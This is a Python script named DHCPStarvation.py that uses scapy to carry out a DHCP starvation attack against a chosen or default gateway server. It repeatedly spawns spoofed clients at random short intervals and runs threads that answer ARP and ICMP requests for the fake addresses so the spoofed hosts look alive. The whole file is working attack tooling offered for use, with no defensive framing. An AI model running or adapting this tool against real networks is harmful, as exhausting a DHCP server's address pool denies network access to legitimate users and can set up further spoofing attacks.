import argparse
import random
import os
import threading

from time import sleep
from scapy.config import conf
from scapy.layers.inet import IP, ICMP
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp, sniff
from Client import Client

# Create the parser
parser = argparse.ArgumentParser(prog='DHCPStarvation.py', description='DHCP Starvation')

# Add the arguments
parser.add_argument('-p', '--persistent', action='store_true', help='persistent?')
parser.add_argument('-i', '--iface', metavar='IFACE', action='store', type=str, help='Interface you wish to use')
parser.add_argument('-t', '--target', metavar='TARGET', action='store', type=str, help='IP of target server')

args = parser.parse_args()


def arp_is_at():
    """
    It listens for ARP who-has packets, and responds with ARP is-at packets
    """
    try:
      sniff(
        iface=Client.iface,
        lfilter=lambda p:
        ARP in p and
        p[ARP].op == 1 and  # its arp who-as type
        p[ARP].pdst in Client.addresses,  # the packet is for one of the clients
        prn=lambda p:
        # send arp is-at
        sendp(
            Ether(
                src=Client.addresses[p[ARP].pdst],
                dst=p[Ether].src
            ) / ARP(
                op=2,  # is-at
                hwsrc=Client.addresses[p[ARP].pdst],
                hwdst=p[Ether].src,
                psrc=p[ARP].pdst,
                pdst=p[ARP].psrc,
            ),
            verbose=0,
            iface=Client.iface
        ),
      )
    except PermissionError:
        print('This program require sudo or admin permissions')
        os._exit(0) 


def icmp_reply():
    """
    It listens for ICMP echo requests (ping) and sends ICMP echo replies (pong) to the source
    """
    try:
      sniff(
        iface=Client.iface,
        lfilter=lambda p:
        ICMP in p and  # its icmp packet
        p[IP].dst in Client.addresses and  # the packet is for one of the clients
        p[ICMP].type == 8,  # its icmp echo request
        prn=lambda p:
        # send icmp echo reply
        sendp(
            Ether(
                dst=p[Ether].src,
                src=Client.addresses[p[IP].dst]
            ) / IP(
                dst=p[IP].src,
                src=p[IP].dst
            ) / ICMP(
                type=0,
            ),
            verbose=0,
            iface=Client.iface
        )
      )
    except PermissionError:
        print('This program require sudo or admin permissions')
        os._exit(0) 


def main():
    # if no interface is specified, use the default interface
    Client.iface = args.iface if args.iface else conf.iface

    # if no target is specified, use the default gateway for that interface
    Client.target = args.target if args.target else max(
        [inter[2] for inter in conf.route.__dict__['routes'] if inter[3] == Client.iface]
    )

    Client.persist = args.persistent

    threading.Thread(target=arp_is_at).start()  # run thread to answer all of arp request send to our ips
    threading.Thread(target=icmp_reply).start()  # run thread to answer all of icmp pings send to our ips

    
    Client.lock = threading.Lock()

    while True:
        Client.lock.acquire(blocking=True)
        Client().start()
        Client.lock.release()
        sleep(random.random() * 0.015)


if __name__ == '__main__':
    main()

